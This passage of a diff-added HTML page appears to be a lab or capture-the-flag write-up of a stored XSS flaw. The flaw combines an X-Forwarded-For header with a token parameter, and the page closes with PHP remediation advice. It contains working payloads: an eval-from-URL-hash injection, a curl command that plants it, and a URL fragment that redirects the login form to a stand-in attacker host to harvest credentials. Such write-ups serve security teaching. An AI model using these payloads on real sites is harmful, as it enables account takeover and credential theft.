+                        &lt;li&gt;&lt;a <span class="hljs-built_in">class</span>=<span class="hljs-string">"black-text text-lighten-3"</span> href=<span class="hljs-string">"https://www.xmco.fr/"</span>&gt;XMCO&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/<span class="hljs-keyword">div</span>&gt;
+            &lt;/<span class="hljs-keyword">div</span>&gt;
+        &lt;/<span class="hljs-keyword">div</span>&gt;
+        &lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">"footer-copyright"</span>&gt;
+            &lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">"container"</span>&gt;
+                &lt;a <span class="hljs-built_in">class</span>=<span class="hljs-string">"black-text text-lighten-4 right"</span> href=<span class="hljs-string">"#!"</span>&gt;&lt;/a&gt;
+            &lt;/<span class="hljs-keyword">div</span>&gt;
+        &lt;/<span class="hljs-keyword">div</span>&gt;
+    &lt;/footer&gt;
+    &lt;!<span class="hljs-comment">--JavaScript at end of body for optimized loading--&gt;</span>
+    &lt;<span class="hljs-keyword">script</span> src=<span class="hljs-string">"/static/main.js?token=' onerror='alert(1)' /&gt;"</span> /&gt;<span class="hljs-string">"&gt;&lt;/script&gt;
+</span></code></pre>
+<p>is essentially interpreted as:</p>
+<pre><code>Your IP Address (<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span>/<span class="hljs-attr">x</span>=<span class="hljs-string">'[...]'</span> <span class="hljs-attr">src</span>=<span class="hljs-string">''</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">'alert(1)'</span> /&gt;</span>" /&gt;"&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
+</code></pre>
+<p>This proof of concept shows an alert box.</p>
+<p><img src="alert.png" alt="Alert box"></p>
+<h2 id="payload">Payload</h2>
+<p>While <code>alert(1)</code> is a common way of proving the presence of XSS vulnerabilities,
+it does not show the full impact of the said vulnerability.</p>
+<p>It is possible to make replace the payload with a snippet of code that evaluates
+an unfiltered script.</p>
+<p>A good way to place the script is in the URL's hash. This value is not limited
+in length, and is not filtered, because this value is never sent to the server.</p>
+<p>The following script session shows how to leverage the URL's hash:</p>
+<pre><code>&gt;&gt;&gt; document<span class="hljs-selector-class">.location</span><span class="hljs-selector-class">.hash</span>
+<span class="hljs-string">"#console.log(%22Hello%20from%20the%20hash!%22)"</span>
+
+&gt;&gt;&gt; document<span class="hljs-selector-class">.location</span><span class="hljs-selector-class">.hash</span><span class="hljs-selector-class">.substr</span>(<span class="hljs-number">1</span>)
+<span class="hljs-string">"console.log(%22Hello%20from%20the%20hash!%22)"</span>
+
+&gt;&gt;&gt; unescape(document<span class="hljs-selector-class">.location</span><span class="hljs-selector-class">.hash</span><span class="hljs-selector-class">.substr</span>(<span class="hljs-number">1</span>))
+<span class="hljs-string">"console.log(\"Hello from the hash!\")"</span>
+
+&gt;&gt;&gt; eval(unescape(document<span class="hljs-selector-class">.location</span><span class="hljs-selector-class">.hash</span><span class="hljs-selector-class">.substr</span>(<span class="hljs-number">1</span>)))
+Hello from the hash! debugger eval <span class="hljs-selector-tag">code</span> line <span class="hljs-number">1</span> &gt; eval:<span class="hljs-number">1</span>:<span class="hljs-number">9</span>
+undefined
+</code></pre>
+<p>In order to leverage this payload, the following inputs can be used:
+<strong>X-Forwarded-For</strong>: <code>&lt;img/x='</code>
+<strong>Token</strong>: <code>' src='' onerror='eval(unescape(document.location.hash.substr(1)))' /&gt;</code></p>
+<h2 id="attack-scenario">Attack scenario</h2>
+<p>The XSS being a client-side vulnerability, it is required to make the victim
+send a request triggering the vulnerability.</p>
+<p>It is not possible to make a victim browser submit a request with a custom
+header (such as <code>X-Forwarded-For</code>). The vulnerability appears unexploitable at
+first glance.</p>
+<p>The IP address displayed shows the IP address of the <strong>previous</strong> request. This
+means an attacker is able to <em>prepare</em> a token by sending a first request with
+the headers used previously.</p>
+<pre><code>$ curl <span class="hljs-string">"http://www.wannatry.fr/?token='</span> src=<span class="hljs-string">''</span> onerror=<span class="hljs-string">'eval(unescape(document.location.hash.substr(1)))'</span> /&gt;<span class="hljs-string">" --header "</span>X-Forwarded-For: &lt;img/x=<span class="hljs-string">'"</span>
+[...]
+</code></pre>
+<p>The XSS will be triggered the next time somebody accesses the website with the
+same token, An attacker could trick a victim to go to a shortened link that
+redirects to the website with the malicious payload.</p>
+<p>An attacker could use the XSS to change the form's <code>action</code>. This will instruct
+the victim's browser to submit the form to a server they control. They will be
+able to retrieve the victim's credentials.</p>
+<pre><code><span class="hljs-link">https://</span>[<span class="hljs-string">...</span>]#document.getElementById(<span class="hljs-emphasis">'login-form'</span>).action = "https://example.org/evil"
+</code></pre>
+<p><img src="action.png" alt="Form's URL changed to the attacker's domain">
+<img src="evil.png" alt="Form being submitted to the attacker's domain"></p>
+<h2 id="remediation">Remediation</h2>
+<p>This vulnerability can be patched by using the PHP functions <code>long2ip</code> and
+<code>ip2long</code> to ensure the IP address is a valid IPv4 address.
+Ideally, the application should not trust the <code>X-Forwarded-For</code> header from any
+clients. This header should only be effective if the client is a known
+reverse-proxy.</p>
+</div></body></html>
